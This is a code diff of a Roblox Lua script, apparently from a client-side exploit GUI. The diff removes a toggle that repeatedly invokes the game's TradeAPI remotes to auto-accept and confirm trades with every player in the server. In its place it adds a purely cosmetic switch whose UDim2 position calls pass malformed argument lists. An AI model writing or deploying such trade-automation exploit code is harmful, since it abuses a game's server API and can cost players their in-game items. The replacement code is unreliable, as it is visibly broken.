@@ -448,47 +448,22 @@ coroutine.wrap(LYTAYH_fake_script)()
 local function DBQCXK_fake_script() -- SwitchButton.SwitchScript 
 	local script = Instance.new('LocalScript', SwitchButton)
 
-	local Players = game:GetService("Players")
-	local ReplicatedStorage = game:GetService("ReplicatedStorage")
 	local button = script.Parent
 	local circle = button:WaitForChild("Circle")
-	local acceptRequest = ReplicatedStorage:WaitForChild("API"):WaitForChild("TradeAPI/AcceptOrDeclineTradeRequest")
-	local acceptNegotiation = ReplicatedStorage:WaitForChild("API"):WaitForChild("TradeAPI/AcceptNegotiation")
-	local confirmTrade = ReplicatedStorage:WaitForChild("API"):WaitForChild("TradeAPI/ConfirmTrade")
-	local enabled = false
-
-	local function acceptTrades()
-		for _, player in ipairs(Players:GetPlayers()) do
-			if player ~= Players.LocalPlayer then
-				pcall(function()
-					acceptRequest:InvokeServer(player, true)
-				end)
-			end
-		end
-
-		pcall(function()
-			acceptNegotiation:FireServer()
-			confirmTrade:FireServer()
-		end)
-	end
-
-	local function setEnabled(value)
-		enabled = value
-		button:SetAttribute("AutoAcceptEnabled", enabled)
-		circle.Position = enabled and UDim2.new(0.47, 0, 0.012, 0) or UDim2.new(0, 0, 0.012, 0)
-		circle.BackgroundColor3 = enabled and Color3.fromRGB(255, 0, 255) or Color3.fromRGB(132, 0, 132)
-	end
-
-	setEnabled(false)
+	
+	local green = false
+	
+	circle.BackgroundColor3 = Color3.fromRGB(132, 0, 132)
+	
 	button.Activated:Connect(function()
-		setEnabled(not enabled)
-		if enabled then
-			task.spawn(function()
-				while enabled and button.Parent do
-					acceptTrades()
-					task.wait(1)
-				end
-			end)
+		green = not green
+	
+		if green then
+			circle.Position = UDim2.new(0.47, 0, 0,0.012, 0)
+			circle.BackgroundColor3 = Color3.fromRGB(255, 0, 255)
+		else
+			circle.Position = UDim2.new(0, 0, 0, 0.12, 0)
+			circle.BackgroundColor3 = Color3.fromRGB(132, 0, 132)
 		end
 	end)
 end
